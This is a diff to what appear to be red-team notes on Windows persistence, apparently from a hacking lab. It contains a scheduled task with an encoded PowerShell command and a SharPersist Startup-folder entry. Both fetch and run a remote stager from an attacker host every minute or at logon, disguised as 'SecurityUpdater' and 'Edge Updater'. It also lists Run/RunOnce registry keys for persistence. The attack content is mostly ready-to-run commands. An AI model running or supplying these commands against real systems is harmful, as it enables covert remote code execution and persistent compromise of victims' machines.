@@ -60,3 +60,20 @@ $encoded
 ```powershell
 execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA="'
 ```
+
+
+## sharpersist
+### Logon Activity
+
+all startup are located at `C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` . we can use `Sharpersist` to add a stager to be loaded each startup.
+
+```powershell
+sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/stager.txt\')\" -f \"Edge Updater\" -m add
+```
+
+### Run and RunOnce
+We can also specify which program to run when a user logs in by editing the registry. Depending on the privilege we already have, we can edit the following registry items:
+- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
